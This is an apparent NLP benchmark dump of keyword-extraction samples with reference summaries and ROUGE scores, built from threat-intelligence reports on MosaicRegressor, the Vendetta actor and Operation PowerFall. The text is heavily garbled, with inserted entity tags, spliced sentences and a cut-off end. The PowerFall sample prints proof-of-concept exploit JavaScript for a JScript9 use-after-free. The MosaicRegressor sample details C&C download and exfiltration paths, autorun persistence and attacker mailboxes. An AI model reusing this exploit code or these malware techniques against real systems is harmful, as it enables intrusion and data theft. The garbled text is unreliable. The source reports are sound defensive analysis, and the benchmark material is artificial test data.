, \u201c [PERSON] CallG \u201d , \u201c CallH \u201d , \u201c CallI \u201d , \u201c CallJ \u201d , \u201c CallK \u201d , \u201c CallL \u201d , \u201c CallM \u201d , \u201c CallN \u201d , \u201c CallO \u201d , \u201c CallP \u201d , \u201c Final\u201d . The signature of the function called \u201c Final \u201d is different from the rest : it takes [CARDINAL] 21 arguments that not only contain those of a BITS Downloader . It is very similar to \u201c HHDump.dll \u201d . The following description includes only the differences . The library provides [CARDINAL] one exported function with the name \u201c RetrievePKCS7FromCA \u201d . The [ORG] DllMain function is empty and the module does n\u2019t have any checks for the name of the current executable . The payload is loaded in the same way as \u201c HHDump.dll \u201d ; the only difference is an additional optional call to the function appeared in \u201c [WORK_OF_ART] BITS [WORK_OF_ART] Downloader , extended \u201d . It is worth noting that the part of the code that checks for , and cancels , the BITS job by name uses the same name lengths as the first \u201c BITS Downloader \u201d ( [CARDINAL] 5 and 6 ) but the correct substring literals \u201c [ORDINAL] first \u201d and \u201c second\u201d . This version does not create any mutex . [ORG] C&C communication period : [CARDINAL] 15 minutesThis version uses the directory % APPDATA%\\Microsoft\\Internet Explorer to store its temporary files . The module creates a text file % APPDATA%\\Microsoft\\Internet Explorer\\%Computername%.dat and writes a hardcoded string in there : LINEThe file is then uploaded to the [ORG] C&C server using the same code that uploads the system information report in \u201c [WORK_OF_ART] BITS [WORK_OF_ART] Downloader , extended\u201d . The names of payloads , filenames and exported function names that are executed from the payload DLLs is identical to the communication routine . [ORG] C&C communication The module downloads several files from its [ORG] C&C server . The URL of the server is hardcoded and varies among the samples . It may download modules specific to either [QUANTITY] 32 - bit or [CARDINAL] 64 - bit target systems , using the suffix \u201c [CARDINAL] 32 \u201d or \u201c [CARDINAL] 64 \u201d correspondingly . For each [ORG] DLL file the download routine enters an infinite loop and continues to the next module only when the current file has been download without errors . Each attempt is followed by a predefined delay that is different for each sample . The [ORDINAL] first file to download is the following : URL of the [ORG] C&C server / msreg_32.dll or URL of the [ORG] C&C server / msreg_64.dllThe file is saved to : % APPDATA%\\msreg.dll . Next , the module attempts to download the files : URL of the [ORG] C&C server / wrtreg_32.dll , saved to % TEMP%\\wrtreg_32.dllURL of the [ORG] C&C server / wrtreg_64.dll , saved to % TEMP%\\wrtreg_64.dllThis library is then loaded , unloaded and deleted . The latter [CARDINAL] two libraries are downloaded and executed only if the file msreg.dll is is nnot present on disk.19Then the module continuously attempts to download another file : URL of the [ORG] C&C server/%Computername%/%PayloadName.dll , saved to % APPDATA%\\%PayloadName%.dll ( % PayloadName% varies , see the list of names)The previous version of the file , if present , is moved to a temporary filename with the prefix % TEMP%\\34F and then deleted . Every time a new such file is successfully downloaded , the module starts a new thread to execute it . Payload ABI The payload file is expected to be a regular Windows [ORG] DLL . The code that interacts with the library is similar to the one used in BITS Downloader . The file is loaded using the standard LoadLibraryA API function . Then it resolves the addresses of functions exported with the names \u201c ExpA \u201d , \u201c ExpB\u201d,\u201cExpC \u201d , \u201c ExpD \u201d , \u201c ExpE \u201d , \u201c ExpF \u201d , \u201c ExpG \u201d . The functions , if present , are then consequently called . Every function has to take [CARDINAL] five arguments passed on the stack by pointers . Depending on the returned values , the module can stop executing the exported functions , download files to disk or upload data produced by the function to the [ORG] C&C server . The data is uploaded with [ORG] HTTP [ORG] POST request to the URL : URL of the [ORG] C&C server / upload.phpThe [ORG] POST request contains the part called \u201c txt \u201d as a file attachment , with its filename and contents provided by the exported function . Notable file properties The binary is statically linked with libcurl and contains the version string \u201c libcurl/7.49.1 \u201d . According to the official [ORG] Curl website , version [CARDINAL] 7.49.1 was released on [DATE] May [DATE] 30 2016.The language identifier of the file \u2019s resources is set to [DATE] 2052 ( \u201c zh - CN \u201d ) . [CARDINAL] One of the resources is its version information communication routines are similar to those found in the \u201c Curl - based downloader\u201d . [ORG] Mutex name : \u201c single UI\u201dSets the autorun registry location : HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run , value dsuiext=%location of the executable%.Every [ORDINAL] second the module checks for the presence of a kill switch file % APPDATA%\\Microsoft\\exitUI.rs and terminates if it is present . The module enters an infinite [ORG] C&C communication loop with a preset delay between each attempt . [ORG] C&C communication [ORDINAL] First , the module sends a test GET request using the URL of the [ORG] C&C server and continues if the attempt succeeds . Then it collects system information and writes the results into a text file % APPDATA%\\%Computername%.dat . The code that collects the system information is identical to the one found in the \u201c BITS Downloader \u201d . Then the resulting file with the system information is sent to the [ORG] C&C server in a [ORG] POST request to % URL of the [ORG] C&C server / upload.php . The code also checks if there is a file % APPDATA%dat present on the disk and if so the file is uploaded instead . The URL of the [ORG] C&C server and the unique identifier ( \u201c EXE ID \u201d ) are hardcoded in the binary and encrypted with a simple [QUANTITY] one - byte XOR operation . Payload When it has finished uploading the system information report the program then attempts to fetch the payload from the [ORG] C&C server . The business logic is similar to the one for \u201c BITS Downloader , extended \u201d , with the following differences : Files that are downloaded and executed in separate [CARDINAL] threads:21%APPDATA%\\Microsoft\\WebA.dll fetched from % C&C URL%/%Computername%/WebA.z%APPDATA%\\Microsoft\\WebB.dll fetched from % C&C URL%/%Computername%/WebB.zFiles that are downloaded and executed in the current thread:%APPDATA%\\Microsoft\\WebC.dll fetched from % C&C URL%/%Computername%/WebC.zEach [ORG] DLL may have [CARDINAL] one or more exported functions named \u201c [PERSON] FunA \u201d , \u201c FunB \u201d , \u201c FunC \u201d , \u201c FunD \u201d , \u201c FunE \u201d , \u201c FunF \u201d , \u201c [PRODUCT] FunG \u201d , \u201c FunH \u201d , \u201c FunI \u201d , \u201c FunJ \u201d . Once finished , the program may delete the [ORG] DLL file depending on the returned value . Depending on the data process but also deletes the autorun registry value . Rich header dump The [QUANTITY] 66 [QUANTITY] modules compiled with [PERSON] Visual [PERSON] Studio 6 are parts of the libcurl library identical to the one used in the \u201c Curl - based discovered along with [CARDINAL] one of the downloader samples . The library has an empty [ORG] DllMain function and [CARDINAL] three exported functions with the names \u201c [ORG] CallA \u201d , \u201c CallB \u201d , \u201c CallC \u201d . The description of these functions follows.23CallA \u2022 creates the directory % APPDATA%\\Microsoft\\Windows \u2022 deletes the file % APPDATA%\\Microsoft\\Windows\\mapisp.dll and , if this fails , renames the file to % TEMP%\\Hx101.tmp \u2022returns the values that result in [ORG] the [ORG] BITS [ORG] Downloader , fetching the file \u201c SecondA.z \u201d from the [ORG] C&C server to % APPDATA%\\Microsoft\\Windows\\mapisp.dllCallB \u2022 creates the directory % APPDATA%\\Microsoft\\Windows\\SendTo \u2022 deletes the file % APPDATA%\\Microsoft\\Windows\\SendTo\\cryptui.sep and , if this fails , renames the file to\u2022%TEMP%\\Hx102.tmp returns the values that result in [ORG] the [ORG] BITS [ORG] Downloader , fetching the file \u201c SecondB.z \u201d from the [ORG] C&C server to % APPDATA%\\Microsoft\\Windows\\SendTo\\cryptui.sepCallC \u2022 sets an autorun registry value : HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run , name mapisp to \u201c rundll32.exe \u201c % APPDATA%\\Microsoft\\Windows\\mapisp.dll\u201d,CryptoSysPrep\u2022 checks if the files \u201c mapisp.dll \u201d ( called \u201c file a \u201d ) and \u201c [PERSON] cryptiu.sep \u201d ( \u201c file b \u201d ) are present \u2022 writes a log of operations into the file % APPDATA%\\Microsoft\\Internet Explorer\\FileOutA.dat and returns Strings written to the log depend on the results of the preceding operations : \u201c [ORDINAL] second file successA \u201d \u201c file a success \u201d or \u201c file a error \u201d \u201c file b success \u201d or \u201c file b error \u201d \u201c registry set success \u201d or \u201c registry set error \u201d \u201c do move file a \u201d or \u201c do not move file a \u201d \u201c do move file b \u201d or \u201c do not move file b \u201d exported function with the name \u201c Load\u201d . Load The function is an infinite loop . [TIME] Every [TIME] five [TIME] minutes it checks if there is a file named % APPDATA%\\Microsoft\\Windows\\LnkClass.dat . If the file is present , it then executes24\u201c%APPDATA%\\Microsoft\\Windows\\LnkClass.dat \u201d a -hpHFG5fv ( * & # -r \u201c % APPDATA%\\Microsoft\\Credentials\\MSI36C2.dat \u201d [ORG] % CSIDL_RECENT%Here , % CSIDL_RECENT% is the location of the \u201c Recent documents \u201d folder . Although the original file named [ORG] LnkClass.dat was not recovered , the command line is valid for a popular archiver called WinRAR - it is a command to store the contents \u201c CryptoSysPrep\u201d . CryptoSysPrep The function checks for the presence of additional [ORG] DLL files and loads them in separate threads:%APPDATA%\\Microsoft\\Windows\\SendTo\\cryptui.sep , called by function RetrievePKCS7FromCA%APPDATA%\\Microsoft\\Network\\sppsvc.sep , copied to % APPDATA%\\Microsoft\\sppsvc.tbl , then loaded and called by function \u201c [PERSON] PlugA\u201d%APPDATA%\\Microsoft\\Network\\subst.sep , copied to % APPDATA%\\Microsoft\\subst.tbl , then loaded and called by All strings related to the business logic are encrypted with a homebrew algorithm similar to RC4 with a hardcoded extended S - Box of [DATE] 1024 bytes . The module checks if there is a file present at % COMMON_APPDATA%\\Microsoft\\Windows\\user.rem . If it is present , the file is copied to % APPDATA\\Microsoft\\dfsadu.dll ; then it is loaded and its export \u201c MediaA \u201d is called in a new thread . Then the function enters an infinite loop . [TIME] Every [TIME] 20 [TIME] minutes it tries to connect to a POP3S server \u201c pop.mail.ru \u201d . The module uses the [ORDINAL] first of [CARDINAL] two pairs of hardcoded credentials that worked . Login ( password hardcoded but not shown)Feedback e - mail addressthtgoolnc@mail.ruthbububugyhb85@mail.ruthgetmmun@mail.ruthyhujubnmtt67@mail.ruThe module attempts to download the [ORDINAL] first e - mail message from the mailbox into the % TEMP% directory using a temporary filename with the prefix \u201c Ht \u201d . If the download succeeds , it deletes the message via [ORG] IMAPS using the same credentials . It parses the [ORG] MIME format using a code that appears to be similar to a widespread open - source class CMimeMessage ( the class name is included in the [FAC] RTTI information too ) . It extracts the message \u2019s subject and continues if it is equal to \u201c RepeatA \u201d , \u201c RepeatB \u201d , \u201c RepeatC \u201d , \u201c RepeatD \u201d . If the subject matches one of the names , the attachment from that message is saved and decrypted and then copied with a [ORG] DLL extension : SubjectRepeatARepeatBRepeatCRepeatD26Temporary [ORG] DLL name%TEMP%\\RepairA.dll%TEMP%\\RepairB.dll%TEMP%\\RepairC.dll%TEMP%\\RepairD.dllThe [ORG] DLL file is then loaded and called by export \u201c MediaA \u201d . Depending on the return value of that function , the [ORG] DLL file may be deleted or left on disk . Also , the module may encrypt a temporary file produced by the function , and send it as an attachment of type \u201c application / x - msdownload \u201d with the name \u201c attach.dat \u201d , to the \u201c feedback \u201d email address via SMTPS . The subject of the message is set to \u201c MINE UPLOAD \u201d and the \u201c From \u201d field is set to the login used to retrieve the incoming messages . OLE2 Equation dropperMD5 : [CARDINAL] 33F21AC73AFF4DFF71316795282A3D06 ( OLE2 part)This is a recovered part of a weaponized document . Since most related code and documents described in public reports are known to be RTF documents , this one could also have been embedded in an RTF document . The OLE2 stream creation date for all the streams is 2019 - 02 - 02 . It contains composite objects of types \u201c [WORK_OF_ART] Microsoft [WORK_OF_ART] Equation [CARDINAL] 3.0 \u201d and \u201c [ORG] Microsoft [ORG] OLE 1.0 Native \u201d . The [ORG] Equation object uses a well - known exploit CVE-2018 - 0802 and the [ORG] OLE 1.0 holds the [ORG] EXE file that is decrypted by the shellcode of the exploit . Several notable findings : The [ORG] OLE 1.0 [ORG] Native [ORG] CompObj stream contains the name in [NORP] Russian \u201c \u041f\u0430\u043a\u0435\u0442 \u201d along with the [LANGUAGE] English name \u201c Package \u201d . It also has starts the executable from its [ORG] DllMain function and returns . Winhttp - based downloaders , extendedThese samples seem to be based on the same code for collecting system information as the downloaders using [ORG] BITS and Curl and use the same text messages with non - ASCII symbols . However the code in these files uses WinHTTP API for value Media=%location of the executable%.The program collects system information in a text file % APPDATA%%Computername% . The data is similar to the [CARDINAL] one collected by other \u201c extended downloaders \u201d , but also includes the list of running processes ( all samples except mounted disks and the listings of their root directories . The text file is uploaded to the [ORG] C&C server with a [ORG] POST request to % C&C server%/upload.php . The module downloads [CARDINAL] two executable files . The [ORDINAL] first file is saved in the % STARTUP% folder and the [ORDINAL] second one is saved in the folder named [PERSON] % APPDATA%\\Microsoft and started immediately . The URLs and names of the files vary . The code also contains references to the file \u201c repeat \u201d but that file is never downloaded . Existing files , if they are present and are different in size , are moved into a temporary file with the prefix % TEMP%\\341 and then deleted . Each file is downloaded from the URL constructed according to the format : % C&C server%/%Computername%/%filename% , Agent string or \u201c Mozilla/4.0\u201d . [ORG] C&C addresses and file [PERSON] namesMD5C&C serverRemote reports a unique hardcoded \u201c ID \u201d similar to the \u201c EXE ID \u201d string used in other types of downloaders . the sample", "generated_text": "MosaicRegressor; a multi-stage; modular framework; espionage; data gathering; C2; exploits; downloaders; intermediate loaders; payloads; the UEFI firmware; two known cases; the initial stage; the victim; the bootkit; persistence; the initial stage; the framework; a hacking team bootkit; VectorEDK; the malicious software; the bootkit; DLL modules; packets; a callback; a keylogger; the bootloader; a C2; commands; Attribution; the GUID; the bootkit; the UEFI; the bootloader; the use; the UEFI system; IP addresses; the bootloader; privileges; the C2 environment; a function; a URL; the APT; a callback; NATFS; the bootkit; the UEFI bootloader; C2; the video; a DLL; a payload; a DLL; a command; the attacker; the use; IP addresses; a UEFI bootloader; the code; a C2; the components; ", "ref_text": "<START-1>The document provides technical details on a malware framework named MosaicRegressor that is used for espionage and data gathering. MosaicRegressor has been seen installed in victim UEFI firmware for persistence. It uses a leaked HackingTeam bootkit called VectorEDK. It has multiple stages and components. Initial downloaders written in C++ fetch additional modules from command and control servers. The downloaders use BITS jobs, libcurl, WinHTTP API, or check webmail for modules. Email attachments are decrypted DLLs or executables. Downloaded modules collect system info and send it to command servers. Later stages exfiltrate documents and data. Components have varying levels of obfuscation. Strings are Base64 or XOR encoded. Payloads use simple exported functions. There are language artifacts suggesting some developers are of Chinese or Korean origin. Code similarities exist to Gaza Hacker Team. Targets are primarily in the Middle East. Both opportunistic attacks and tailored phishing emails have been observed. Low sophistication but modular design makes MosaicRegressor extensible. Persistence in firmware raises the stakes of infections. While not advanced, the framework's continuing evolution, targeting, and shadowy control indicate an experienced threat actor. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.3832335329341317, "gpt3/lexical/rouge_rouge2": 0.07831325301204818, "gpt3/lexical/rouge_rougeL": 0.17964071856287425, "gpt3/lexical/rouge_rougeLsum": 0.17964071856287425, "gpt3_generated_text": ["MosaicRegressor is a multi-stage and modular framework designed for espionage and data gathering. It includes downloaders and intermediate loaders that fetch and execute payloads on victim machines. In two known cases, the initial stage of the framework was installed in the victim's UEFI firmware, providing persistence at an above-OS level. The UEFI bootkit used in these cases was a leaked Hacking Team bootkit called VectorEDK. The bootkit includes components such as a DXE driver to deploy the bootkit, a driver to parse the NTFS file system, a UEFI application to mark the execution of the bootkit, and the main bootkit component that serves as a persistent dropper for user-mode malware. This component writes a binary as a file named 'IntelUpdate.exe' to the startup directory on disk, allowing it to run during the boot process. MosaicRegressor also utilizes C2 communication, exploits, and payloads to carry out its espionage activities."]}, {"split_name": "val", "sample_id": "val_116", "prompt_text": "Extract the keywords: [CARDINAL] 5/15/2020Vendetta - new - threat - actor - from - EuropeVendetta - new threat actor from [LOC] Europe blog.360totalsecurity.com/en/vendetta-new-threat-actor-from-europeMay [CARDINAL] 14 , [CARDINAL] 2020Learn more about 360 Total Security Starting in [DATE] April [DATE] this [DATE] year , [CARDINAL] 360 Baize Lab intercepted a large number of attack samples from an unknown hacker organization . The hacker organization sent a phishing email to the victim by forging a police station investigation letter , COVID-19 detection notice , etc . , Through the backdoor virus to control the victim \u2019s machine , steal valuable sensitive data related to the target . The [ORG] PDB path of the virus samples used by the organization points to a user named \u201c [WORK_OF_ART] Vendetta \u201d , and we will later also name the hacker organization [ORG] Vendetta:\u201cC:\\Users\\Vendetta\\source\\repos\\{project [ORG] name}\\*\\obj\\Debug\\{project [ORG] name}.pdb\u201dIn some samples , we have repeatedly detected the following tags , the virus author claims that he is from [GPE] Italy : However , we found in the naming of virus samples that virus authors like to use certain [NORP] Turkish names to name variables , such as \u201c [ORG] RoboSki \u201d , so we suspect that the organization originated in [LOC] Europe : [PRODUCT] Vendetta is a hacker organization that is very good at using social engineering . They forge phishing emails very realistically . They can easily gain users \u2019 trust and guide users to open the malicious programs they carry . The picture below is a [PRODUCT] Vendetta forgery of the investigation letter issued by [ORG] the [ORG] Austrian [ORG] Federal [ORG] Ministry [ORG] of [ORG] the [ORG] Interior ( BMI)url investigation letter from the [NORP] Romanian police station : url the COVID-19 virus test email issued by [ORG] the [ORG] Australian [ORG] Government [ORG] Department [ORG] of [ORG] Health . The email stated that the victim had contact with a con\ufb01rmed case within [DATE] the [DATE] past [DATE] 14 [DATE] days . It is recommended to read the test guide in the attachment and accept the test : url a virus test email issued by the [NORP] Mexican health department : url well as the forged email quoted by the [NORP] Egyptian [ORG] Orascom [PRODUCT] Group:.url compressed \ufb01le in the email attachment contains the [GPE] Trojan \ufb01le , which is generally named after pdf.exe , [ORG] Document.exe , etc . After running , it decrypts and loads the subsequent virus module in memory.url In all samples , we detected the same type of code obfuscator , and according to its [ORG] PDB debugging path , we named it [ORG] RoboSki : [ORG] RoboSki encrypts and stores the shellcode in the pixels of the picture . The following \ufb01gure is the code logic to extract the available pixel data and decrypt the shellcode : url execution logic of [ORG] ReZer0 is controlled by hard - coded built - in instructions . According to different instructions , different malicious functions are executed . Its design logic resembles the design method of backdoor programs : url have sorted out the hard - coded instructions and their corresponding meanings , most of which are not used : Hardcode[x ] Description 0[0 ] = = [CARDINAL] 4 load the plugin from the resource into memory [ 0 ] ! = [CARDINAL] 4 Inject the plugin in the resource into the system process to execute Whether to register scheduled tasks [PERSON] Download and execute any \ufb01le [PERSON] Download \ufb01le URL The execution path of the downloaded \ufb01le1 6url 35Whether to detect the virtual machine Whether to detect sandbox [PERSON] ByPass antivirus software Show \ufb01le version Sleep ( ) Sleep durationIn the [CARDINAL] 360 massive data , we found that ReZer0 has an obvious version identi\ufb01cation . In conjunction with the above - mentioned large number of instructions used , we speculate that the software is still in the development stage , and it will not be ruled out that the program will be controlled through network communication in the future : In addition to the nature of the backdoor virus , [ORG] ReZer0 also carries known remote control [NORP] Trojans such as [ORG] NanoCore and [GPE] Remcos in the resources . We will not repeat the remote control functions such as [ORG] NanoCore . We take some of the victims of [PRODUCT] Vendetta as an example to speculate the purpose of their actions.url Fruit Company of Australia ( [ORG] PAI ) is a representative institution and a non - pro\ufb01t membership organization that supports the passion fruit industry in [GPE] Australia . [ORG] PAI is an umbrella organization that represents and enhances the interests of everyone in the passion fruit industry , including growers , packers , wholesalers , exporters , researchers , and retail stores . Of course , [ORG] Vendetta \u2019s attack target is not only the [ORG] PAI family . We have roughly described the distribution of [ORG] Vendetta \u2019s attack target by statistically the distribution of related samples , and its attack purpose is to steal related commercial information.url is an active hacking organization that started in [DATE] April [DATE] 2020 . The organization may have originated in [LOC] Europe . It is good at using social engineering to launch cyber attacks . The purpose of the attack is to steal targeted business intelligence .", "generated_text": "PDF; 360 Baize Lab; a hacker; Vendetta; a phishing email; the victim; a phishing email; a police station investigation letter; COVID-19 detection notice; information; the backdoor virus; phishing emails; phishing emails; PDB; detail; PDB; commands; steal sensitive data; the backdoor; the code; the injection; code logic; the anti-virus software; ransomware; the malware; sandbox; ByPass; the threat actor; id; Europe.", "ref_text": "<START-1>The document analyzes a new threat actor named Vendetta that has been active since April 2020. Vendetta appears to originate from Europe based on language clues in their malware code. Vendetta conducts cyber espionage campaigns that rely heavily on social engineering, forging phishing emails posing as government agencies and companies to get users to open malware. Email topics include police investigations, COVID-19 alerts, and corporate communications. Vendetta's malware uses code obfuscators like RoboSki to hide malicious payloads and execution logic in image files. The remote access Trojan ReZer0 contains hardcoded instructions to carry out functions like downloading additional files, keylogging, and stealing data. Analysis of Vendetta's targets indicates they aim to steal business intelligence and commercial information. Targets span multiple industries and countries, including an Australian fruit industry association. In summary, Vendetta is a new, likely Europe-based threat actor that has been conducting cyber espionage since April 2020 using social engineering and custom malware, with the goal of stealing sensitive business data from commercial entities. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.4194373401534527, "gpt3/lexical/rouge_rouge2": 0.08226221079691516, "gpt3/lexical/rouge_rougeL": 0.20971867007672634, "gpt3/lexical/rouge_rougeLsum": 0.20971867007672634, "gpt3_generated_text": ["In April 2020, 360 Baize Lab discovered a new threat actor known as Vendetta, originating from Europe. Vendetta utilizes social engineering techniques, particularly through phishing emails, to gain the trust of victims and carry out attacks. The hacker organization sends phishing emails, such as police station investigation letters and COVID-19 detection notices, to victims. Through a backdoor virus, Vendetta gains control of the victim's machine and steals valuable sensitive data. The virus samples used by Vendetta often include Turkish names, suggesting a European origin. The article also discusses the code obfuscator used by Vendetta, known as RoboSki, which encrypts and stores shellcode in picture pixels. The article further highlights the hard-coded instructions and their corresponding functions, such as downloading and executing files, bypassing antivirus software, and detecting virtual machines. The article speculates that the software used by Vendetta is still in the development stage, and it may incorporate network communication in the future. Additionally, the backdoor virus ReZer0, used by Vendetta, carries remote control Trojans like NanoCore and Remcos. The article provides an example of Vendetta targeting the Fruit Company of Australia (PAI), but notes that Vendetta's attack targets are not limited to PAI. The article concludes by emphasizing the importance of being cautious of phishing emails and maintaining strong cybersecurity measures to protect against threats like Vendetta."]}, {"split_name": "val", "sample_id": "val_117", "prompt_text": "Extract the keywords: [CARDINAL] 8/14/2020Internet Explorer and Windows [DATE] zero - [DATE] day exploits used in [FAC] Operation [FAC] PowerFall | SecurelistInternet Explorer and Windows [DATE] zero - [DATE] day exploits used in [GPE] Operation [GPE] PowerFallsecurelist.com/ie-and-windows-zero-day-operation-powerfall/97976By Boris [ORG] Larin [ORG] Executive summaryIn [DATE] May [DATE] 2020 , Kaspersky technologies prevented an attack on a [NORP] South [NORP] Korean company by a malicious script for Internet Explorer . Closer analysis revealed that the attack used a previously unknown full chain that consisted of [CARDINAL] two [DATE] zero - [DATE] day exploits : a remote code execution exploit for Internet Explorer and an elevation of privilege exploit for Windows . Unlike a previous full chain that we discovered , used in [EVENT] Operation [EVENT] WizardOpium , the new full chain targeted the latest builds of [FAC] Windows [FAC] 10 , and our tests demonstrated reliable exploitation of Internet Explorer 11 and Windows 10 build 18363 x64.On [DATE] June 8 , [DATE] 2020 , we reported our discoveries to [ORG] Microsoft , and the company confirmed the vulnerabilities . At the time of our report , the security team at [ORG] Microsoft had already prepared a patch for vulnerability CVE-2020 - 0986 that was used in the [DATE] zero - [DATE] day elevation of privilege exploit , but before our discovery , the exploitability of this vulnerability was considered less likely . The patch for CVE-2020 - 0986 was released on [DATE] June [DATE] 9 , [PERSON] 2020.Microsoft assigned CVE-2020 - 1380 to a use - after - free vulnerability in [GPE] JScript and the patch was released on [DATE] August [DATE] 11 , 2020.We are calling this and related attacks \u2018 [EVENT] Operation [EVENT] PowerFall \u2019 . Currently , we are unable to establish a definitive link with any known threat actors , but due to similarities with previously discovered exploits , we believe that [ORG] DarkHotel may be behind this attack . Kaspersky products detect [ORG] Operation [ORG] PowerFall attacks with verdict [ORG] PDM : [GPE] Exploit . Win32.Generic . Internet Explorer 11 remote code execution exploitThe most recent [DATE] zero - [DATE] day exploits for Internet Explorer discovered in the wild relied on the vulnerabilities CVE-2020 - 0674 , CVE-2019 - 1429 , CVE-2019 - 0676 and CVE-2018- [DATE] 8653 in the legacy JavaScript engine [ORG] jscript.dll . In contrast , CVE-2020 - 1380 is a vulnerability in [GPE] jscript9.dll , which has been used by default starting with Internet Explorer 9 , and because of this , the mitigation steps recommended by [ORG] Microsoft ( restricting the usage of jscript.dll ) can not protect against this particular vulnerability.url [PRODUCT] Explorer and Windows [DATE] zero - [DATE] day exploits used in [FAC] Operation [FAC] PowerFall | SecurelistCVE-2020 - 1380 is a Use - After - Free vulnerability that is caused by [ORG] JIT optimization and the lack of necessary checks in just - in - time compiled code . A proof - of - concept ( [EVENT] PoC ) that triggers vulnerability is demonstrated below:1 [CARDINAL] 46function func(O , A , F , O2 ) { arguments.push = [PERSON] Array.prototype.push ; O = [CARDINAL] 1 ; arguments.length = [CARDINAL] 0 ; arguments.push(O2 ) ; if ( F = = [CARDINAL] 1 ) { // execute abp.valueOf ( ) and write by dangling pointer A[5 ] = O ; var an = new ArrayBuffer(0x8c ) ; var fa = new [NORP] Float32Array(an ) ; func(1 , fa , [CARDINAL] 1 , { } ) ; for ( var i = [CARDINAL] 0 ; i < 0x10000 ; i++ ) { func(1 , fa , [CARDINAL] 1 , [CARDINAL] 1 ) ; abp.valueOf = function ( ) { worker = new Worker('worker.js ' ) ; worker.postMessage(an , [ an ] ) ; var start = Date.now ( ) ; while ( Date.now ( ) - start < [CARDINAL] 200 ) { } // [PERSON] TODO : reclaim freed memory func(1 , fa , 0 , abp ) ; } url [ORG] Explorer and Windows [DATE] zero - [DATE] day exploits used in [FAC] Operation [FAC] PowerFall | [PERSON] SecurelistTo understand this vulnerability , let us take a look at how func ( ) is executed . It is important to understand what value is set to A[5 ] . According to the code , it should be an O argument . At function start , the O argument is re - assigned to [CARDINAL] 1 , but then the function arguments length is set to [CARDINAL] 0 . This operation does not clear function arguments ( as it would normally do with regular array ) but allows to put argument [CARDINAL] O2 into the arguments list at index [CARDINAL] zero using [PERSON] Array.prototype.push , meaning O = O2 now . Besides that , if the argument F is equal to [CARDINAL] 1 , then O will be re - assigned once again , but to the integer number [CARDINAL] 2 . It means that depending on the value of the [CARDINAL] F argument , the O argument is equal to either the value of the [CARDINAL] O2 argument or the integer number [CARDINAL] 2 . The argument A is a typed array of [CARDINAL] 32 - bit floating point numbers , and before assigning a value to index [CARDINAL] 5 of the array , this value should be converted to a float . Converting an integer to a float is a relatively simple task , but it become less straightforward when an object is converted to a float number . The exploit uses the object abp with an overridden valueOf ( ) method . This method is executed when the object is converted to a float , but inside the method there is code that frees [ORG] ArrayBuffer , which is viewed by [ORG] Float32Array and where the returned value will be set . To prevent the value from being stored in the memory of the freed object , the [ORG] JavaScript engine needs to check the status of the object before storing the value in it . To convert and store the float value safely , [PERSON] JScript9.dll uses the function Js::TypedArray < float,0>::BaseTypedDirectSetItem ( ) . You can see decompiled code of this function below:1 [CARDINAL] 22int Js::TypedArray < float,0>::BaseTypedDirectSetItem(Js::TypedArray < float,0 > * this , unsigned int index , void * object , int reserved ) { Js::JavascriptConversion::ToNumber(object , this->type->library->context ) ; if ( [PERSON] LOBYTE(this->view[0]->unusable ) ) Js::JavascriptError::ThrowTypeError(this->type->library->context , 0x800A15E4 , 0 ) ; if ( index < this->count ) { * ( float * ) & this->buffer[4 * index ] = Js::JavascriptConversion::ToNumber ( object , this->type->library->context ) ; double Js::JavascriptConversion::ToNumber(void * object , struct Js::ScriptContext if ( ( unsigned char)object & 1 ) return ( double)((int)object > > 1 ) ; if ( * ( void * * ) object = = VirtualTableInfo < Js::JavascriptNumber>::Address[0 ] ) return * ( ( double * ) object + 1 ) ; return Js::JavascriptConversion::ToNumber_Full(object , context ) ; } This function checks the view[0]->unusable and count fields of the typed float array and when [ORG] ArrayBuffer is freed during execution of the valueOf ( ) method , both of these checks will fail because view[0]->unusable will be set to [CARDINAL] 1 and count will be set to [CARDINAL] 0 during theurl [ORG] Explorer and Windows [DATE] zero - [DATE] day exploits used in [FAC] Operation [FAC] PowerFall | Securelistfirst call to Js::JavascriptConversion::ToNumber ( ) . The problem lies in the fact that the function Js::TypedArray < float,0>::BaseTypedDirectSetItem ( ) is used only in interpretation mode . When the function func ( ) is compiled just in time , the [ORG] JavaScript engine will use the vulnerable code below.1 22if ( ! ( ( unsigned char)floatArray [LAW] & [LAW] 1 ) [LAW] & [LAW] & [LAW] * ( void * ) floatArray = = & Js::TypedArray < float,0>::vftable ) { if ( floatArray->count > index ) { buffer = floatArray->buffer + 4*index ; if ( object & 1 ) { * ( float * ) buffer = ( double)(object > > 1 ) ; if ( * ( void * ) object ! = & Js::JavascriptNumber::vftable ) { Js::JavascriptConversion::ToFloat_Helper(object , ( float * ) buffer , context ) ; * ( float * ) buffer = * ( double * ) ( object->value ) ; } And here is the code of the Js::JavascriptConversion::ToFloat_Helper ( ) function.1 4void Js::JavascriptConversion::ToFloat_Helper(void * object , float * buffer , struct Js::ScriptContext * context ) { * buffer = Js::JavascriptConversion::ToNumber_Full(object , context ) ; } As you can see , unlike in interpretation mode , in just - in - time compiled code , the life cycle of [ORG] ArrayBuffer is not checked , and its memory can be freed and then reclaimed during a call to the valueOf ( ) function . Additionally , the attacker can control at what index the returned value is written . However , in the case when \u201c arguments.length = 0;\u201dand \u201c arguments.push(O2 ) ; \u201d are replaced in [DATE] PoC with \u201c arguments[0 ] = O2 ; \u201d then Js::JavascriptConversion::ToFloat_Helper ( ) will not trigger the bug because implicit calls will be disabled and it will not perform a call to the valueOf ( ) function . To ensure that the function func ( ) is compiled just in time , the exploit executes this function [CARDINAL] 0x10000 times , performing a harmless conversion of the integer , and only after that func ( ) is executed once more , triggering the bug . To free [PRODUCT] ArrayBuffer , the exploit usesurl [ORG] Explorer and Windows [DATE] zero - [DATE] day exploits used in [FAC] Operation [FAC] PowerFall | Securelista common technique abusing [ORG] the [ORG] Web [ORG] Workers [ORG] API . The function postMessage ( ) can be used to serialize objects to messages and send them to the worker . As a side effect , transferred objects are freed and become unusable in the current script context . When [ORG] ArrayBuffer is freed , the exploit triggers garbage collection via code that simulates the use of the Sleep ( ) function : it is a while loop that checks for the time lapse between Date.now ( ) and the previously stored value . After that , the exploit reclaims the memory with integer [DATE] arrays.1 [DATE] 4for ( var i = [CARDINAL] 0 ; i < T.length ; i + = [CARDINAL] 1 ) { T[i ] = new Array((0x1000 - 0x20 ) / 4 ) ; T[i][0 ] = 0x666 ; // item needs to be set to allocate LargeHeapBucket } When a large number of arrays is created , Internet [ORG] 